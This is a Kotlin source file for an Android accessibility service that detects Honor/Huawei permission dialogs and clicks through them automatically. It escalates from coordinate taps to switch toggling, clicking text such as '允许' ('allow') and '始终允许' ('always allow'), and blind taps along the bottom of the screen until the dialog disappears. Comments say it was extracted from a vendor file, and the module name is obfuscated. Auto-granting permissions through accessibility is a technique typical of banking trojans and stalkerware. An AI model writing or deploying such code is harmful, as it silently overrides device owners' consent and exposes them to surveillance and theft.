package com.storm.safe.rock.service.modules.yw5xud.huawei

import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps
import com.storm.safe.rock.service.modules.yw5xud.common.GestureTapHelper
import com.storm.safe.rock.service.modules.yw5xud.common.SwitchNodeFinder
import kotlinx.coroutines.delay

/**
 * Honor Permission Dialog detection + multi-mode click (vendor m212161a8, L915-1309).
 *
 * Not a numbered step -- this is invoked by the accessibility event handler when a
 * Honor permission dialog is detected. Extracted from HuaweiSteps to reduce line count.
 */
class HuaweiHonorPermDialog(
    private val service: MyAccessibilityService?,
    private val ui: UiAutomation,
    private val steps: HuaweiSteps
) {
    companion object {
        private const val TAG = "HuaweiHonorPermDialog"
    }

    /**
     * Detect and click Honor permission dialog using 4 escalating modes:
     * 1. Primary + alternate coordinate taps
     * 2. Switch/checkbox gesture click
     * 3. Text-based keyword click ("允许", "始终允许", etc.)
     * 4. Bottom-area scan clicks
     */
    suspend fun detectAndClick(): HuaweiSteps.HonorClickResult {
        if (!steps.isHuawei) return HuaweiSteps.HonorClickResult.NotFound

        try {
            val windowTitle = getHonorPermissionWindowTitle() ?: return HuaweiSteps.HonorClickResult.NotFound

            android.util.Log.d(TAG, "[荣耀权限] 检测到弹窗: $windowTitle")
            val cfg = HuaweiSteps.getHonorPercentConfig(windowTitle)
            android.util.Log.d(TAG, "[荣耀权限] ${cfg.description}")
            val w = steps.getScreenWidthPx()
            val h = steps.getScreenHeightPx()
            android.util.Log.d(TAG, "[荣耀权限] 屏幕尺寸: ${w}x${h}")

            // Primary coord
            val px = (w * cfg.x1).toInt()
            val py = (h * cfg.y1).toInt()
            android.util.Log.d(TAG, "[荣耀权限] 主坐标: (${(cfg.x1 * 100).toInt()}%, ${(cfg.y1 * 100).toInt()}%) -> ($px, $py)")
            gestureCoordinateTap(px.toFloat(), py.toFloat())
            delay(100L)

            val afterPrimary = currentHonorPermissionTitle()
            if (afterPrimary == null || afterPrimary != windowTitle) {
                android.util.Log.d(TAG, "[荣耀权限] 主坐标点击有效，弹窗已变化")
                return HuaweiSteps.HonorClickResult.Clicked("")
            }

            // Alternate coord
            android.util.Log.d(TAG, "[荣耀权限] 主坐标点击无效，尝试备用坐标...")
            val ax = (w * cfg.x2).toInt()
            val ay = (h * cfg.y2).toInt()
            gestureCoordinateTap(ax.toFloat(), ay.toFloat())
            delay(100L)

            val afterAlt = currentHonorPermissionTitle()
            if (afterAlt == null || afterAlt != windowTitle) {
                android.util.Log.d(TAG, "[荣耀权限] 备用坐标点击有效，弹窗已变化")
                return HuaweiSteps.HonorClickResult.Clicked("")
            }

            // Mode 1: switch click
            android.util.Log.d(TAG, "[荣耀权限] 模式1: 遍历开关")
            clickFirstUncheckedSwitchViaGesture()
            delay(100L)
            val afterMode1 = currentHonorPermissionTitle()
            if (afterMode1 == null || afterMode1 != windowTitle) {
                android.util.Log.d(TAG, "[荣耀权限] 模式1有效")
                return HuaweiSteps.HonorClickResult.Clicked("")
            }

            // Mode 2: keyword text click
            android.util.Log.d(TAG, "[荣耀权限] 模式2: 点击允许文本")
            for (keyword in HuaweiSteps.MODE2_KEYWORDS) {
                val node = findVisibleClickableNodeByText(keyword) ?: continue
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                delay(100L)
            }
            delay(100L)
            val afterMode2 = currentHonorPermissionTitle()
            if (afterMode2 == null || afterMode2 != windowTitle) {
                android.util.Log.d(TAG, "[荣耀权限] 模式2有效")
                return HuaweiSteps.HonorClickResult.Clicked("")
            }

            // Mode 3: bottom area scan
            android.util.Log.d(TAG, "[荣耀权限] 模式3: 底部区域扫描点击")
            val bottomY = (h * 0.92f).toInt()
            val xFractions = listOf(0.25f, 0.5f, 0.75f)
            for (xFrac in xFractions) {
                val scanX = (w * xFrac).toInt()
                android.util.Log.d(TAG, "[荣耀权限] 点击: ($scanX, $bottomY)")
                gestureCoordinateTap(scanX.toFloat(), bottomY.toFloat())
                delay(100L)
                val afterMode3 = currentHonorPermissionTitle()
                if (afterMode3 == null || afterMode3 != windowTitle) {
                    android.util.Log.d(TAG, "[荣耀权限] 模式3有效")
                    return HuaweiSteps.HonorClickResult.Clicked("")
                }
            }

            android.util.Log.d(TAG, "[荣耀权限] 所有模式都无效")
            return HuaweiSteps.HonorClickResult.NotFound

        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            android.util.Log.w(TAG, "[荣耀权限] 检测异常: ${e.message}")
            return HuaweiSteps.HonorClickResult.NotFound
        }
    }

    // ---- helpers ----

    private fun getHonorPermissionWindowTitle(): String? {
        val svc = service ?: return null
        return try {
            val windows = svc.windows ?: return null
            for (win in windows) {
                val t = win.title?.toString() ?: continue
                if (HuaweiSteps.isHonorPermissionTitle(t)) return t
            }
            null
        } catch (_: Exception) {
            null
        }
    }

    private fun currentHonorPermissionTitle(): String? {
        val svc = service ?: return null
        try {
            val windows = svc.windows
            if (windows != null) {
                for (win in windows) {
                    val t = win.title?.toString() ?: continue
                    if (HuaweiSteps.isHonorPermissionTitle(t)) return t
                }
            }
        } catch (_: Exception) {}
        try {
            val root = svc.rootInActiveWindow ?: return null
            val texts = HuaweiPageDetector.collectTexts(root)
            for (t in texts) {
                if (HuaweiSteps.isHonorPermissionTitle(t)) return t
            }
        } catch (_: Exception) {}
        return null
    }

    private suspend fun gestureCoordinateTap(x: Float, y: Float) {
        val svc = service ?: return
        GestureTapHelper.performTap(svc, x, y, durationMs = GestureTapHelper.TAP_DURATION_MS_LONG)
    }

    private fun clickFirstUncheckedSwitchViaGesture(): Boolean {
        val svc = service ?: return false
        val root = try { svc.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        val node = SwitchNodeFinder.findFirstUnchecked(root) ?: return false
        val rect = android.graphics.Rect()
        node.getBoundsInScreen(rect)
        val cx = rect.exactCenterX()
        val cy = rect.exactCenterY()
        android.util.Log.d(TAG, "[clickFirstUncheckedSwitch] 点击开关: ($cx, $cy)")
        return HuaweiGestureHelper(svc).gestureTapFast(cx, cy)
    }

    private fun findVisibleClickableNodeByText(text: String): AccessibilityNodeInfo? {
        val svc = service ?: return null
        val root = try { svc.rootInActiveWindow } catch (_: Exception) { null } ?: return null
        val nodes = try { root.findAccessibilityNodeInfosByText(text) } catch (_: Exception) { null }
            ?: return null
        for (node in nodes) {
            if (node.isClickable) return node
        }
        return null
    }
}
